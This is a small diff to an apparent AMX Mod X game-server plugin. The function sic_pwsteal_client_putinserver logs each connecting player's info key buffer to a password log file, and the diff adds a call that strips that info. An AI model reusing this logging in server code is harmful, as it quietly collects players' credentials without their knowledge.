@@ -35,5 +35,7 @@ public sic_pwsteal_client_putinserver(id)
 		sic_userinfo_logstring(id, p_userlogstr, charsmax(p_userlogstr))
 		get_info_keybuffer(id, p_keybuffer, charsmax(p_keybuffer))
 		log_to_file(const_password_log_file, "%s info key buffer (value ^"%s^")", p_userlogstr, p_keybuffer)
+
+		sic_userinfo_stripinfo(id)
 	}
 }
